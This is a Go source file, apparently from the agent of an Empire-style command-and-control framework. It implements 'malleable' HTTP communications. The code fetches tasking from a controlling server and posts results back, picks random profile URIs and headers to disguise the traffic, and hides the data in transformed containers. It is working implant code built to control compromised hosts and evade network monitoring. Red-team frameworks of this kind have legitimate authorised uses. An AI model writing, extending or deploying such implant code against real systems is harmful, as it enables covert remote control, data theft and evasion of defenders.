//go:build malleable

package comms

import (
	"bytes"
	"io"
	"math/rand"
	"net/http"
)

// NewMalleableHttpMessageSender wraps NewHttpMessageSender and additionally
// parses the base64-encoded JSON malleable profile blob, stashing the result
// on sender.malleable so trySendMalleable can route through it.
//
// Only available under `-tags malleable` — non-malleable builds use
// NewHttpMessageSender and get a trySendMalleable stub.
func NewMalleableHttpMessageSender(server string, headers map[string]string, legacyProfile, malleableB64, sessionCookie string, defaultPage []byte) (*HttpMessageSender, error) {
	sender := NewHttpMessageSender(server, headers, legacyProfile, sessionCookie, defaultPage)
	mp, err := ParseMalleableProfile(malleableB64)
	if err != nil {
		return nil, err
	}
	if mp != nil {
		sender.malleable = mp
	}
	return sender, nil
}

// trySendMalleable runs the profile-driven pipeline when a *MalleableProfile
// is attached. Returns handled=false only when no profile is attached, so the
// caller falls through to legacy; a profile missing a section or container is
// handled inside sendMalleable, which falls back to sendLegacy itself.
func (sender *HttpMessageSender) trySendMalleable(kind RequestKind, routingPacket []byte) (bool, []byte, error) {
	mp, ok := sender.malleable.(*MalleableProfile)
	if !ok || mp == nil {
		return false, nil, nil
	}
	resp, err := sender.sendMalleable(mp, kind, routingPacket)
	return true, resp, err
}

// sendMalleable builds a request from the chosen section of the malleable
// profile, applies the relevant transform pipeline to the routing packet,
// stores it at the configured terminator, executes the request, and reverses
// the server's output container on the response body / header / etc.
//
// Tasking requests use the get section and its Metadata container (the only
// one GET has); results use the post section and its Output container, like
// the PS/Python agents http_malleable.py::generate_comms emits. The post `id`
// / Metadata slot is a server-side extract hint reference agents ignore: the
// server concatenates id+output, so everything on output arrives verbatim.
func (sender *HttpMessageSender) sendMalleable(mp *MalleableProfile, kind RequestKind, routingPacket []byte) ([]byte, error) {
	sectionName := "post"
	if kind == RequestTasking {
		sectionName = "get"
	}
	section, ok := mp.Sections[sectionName]
	if !ok {
		// Profile missing the section we need — fall back to legacy so the
		// agent can still check in.
		return sender.sendLegacy(kind, routingPacket)
	}
	client := section.Client
	if len(client.URIs) == 0 {
		return sender.sendLegacy(kind, routingPacket)
	}

	verb := client.Verb
	if verb == "" {
		verb = "GET"
	}
	uri := client.URIs[rand.Intn(len(client.URIs))]
	requestURL := sender.Server + uri

	// Seed the request with the section body (profile-defined cover
	// payload). The terminator may overwrite this when it's PRINT. Body
	// is base64-encoded in the profile schema so high-bit bytes survive
	// JSON transport — decode before writing.
	var bodyReader io.Reader
	if client.Body != "" {
		bodyBytes, decodeErr := decodeTransformValue(client.Body)
		if decodeErr != nil {
			return nil, decodeErr
		}
		if len(bodyBytes) > 0 {
			bodyReader = bytes.NewReader(bodyBytes)
		}
	}

	req, err := http.NewRequest(verb, requestURL, bodyReader)
	if err != nil {
		return nil, err
	}

	// Static parameters from the profile. Terminator-driven parameters
	// (if metadata uses PARAMETER) will overwrite the specific key.
	if len(client.Parameters) > 0 {
		q := req.URL.Query()
		for k, v := range client.Parameters {
			q.Set(k, v)
		}
		req.URL.RawQuery = q.Encode()
	}

	// Apply sender-level defaults first, then let the profile-declared
	// headers override them. The profile explicitly picks User-Agent (and
	// friends) to blend traffic — letting sender.Headers stomp on that
	// would defeat the whole point of malleable mode.
	for k, v := range sender.Headers {
		req.Header.Set(k, v)
	}
	for k, v := range client.Headers {
		req.Header.Set(k, v)
	}

	// GET carries the routing packet on Metadata; POST on Output (Empire
	// convention — see comment on sendMalleable). Fall back to legacy when
	// the expected container is absent rather than silently dropping the
	// routing packet.
	packetContainer := client.Metadata
	if sectionName == "post" {
		packetContainer = client.Output
	}
	if packetContainer == nil {
		return sender.sendLegacy(kind, routingPacket)
	}
	transformed, err := packetContainer.Apply(routingPacket)
	if err != nil {
		return nil, err
	}
	if err := StoreTerminator(req, transformed, packetContainer.Terminator); err != nil {
		return nil, err
	}

	resp, err := sender.httpClient().Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if err := checkStatus(resp.StatusCode); err != nil {
		// Drain so the connection can be reused.
		_, _ = io.Copy(io.Discard, resp.Body)
		return nil, err
	}

	// Extract + reverse the server output. A nil server output container
	// means "return raw body" (print / identity).
	var out []byte
	if section.Server.Output != nil {
		raw, err := ExtractTerminator(resp, section.Server.Output.Terminator, client.URIs)
		if err != nil {
			return nil, err
		}
		if out, err = section.Server.Output.Reverse(raw); err != nil {
			return nil, err
		}
		// Header/parameter terminators never read the body; drain it so the
		// connection goes back to the pool.
		_, _ = io.Copy(io.Discard, resp.Body)
	} else if out, err = io.ReadAll(resp.Body); err != nil {
		return nil, err
	}
	if len(out) == 0 {
		// The malleable listener's "no tasking": construct_server with no
		// output yields empty bytes once the profile's transforms are
		// reversed, whatever terminator carried them.
		return nil, nil
	}
	return out, nil
}
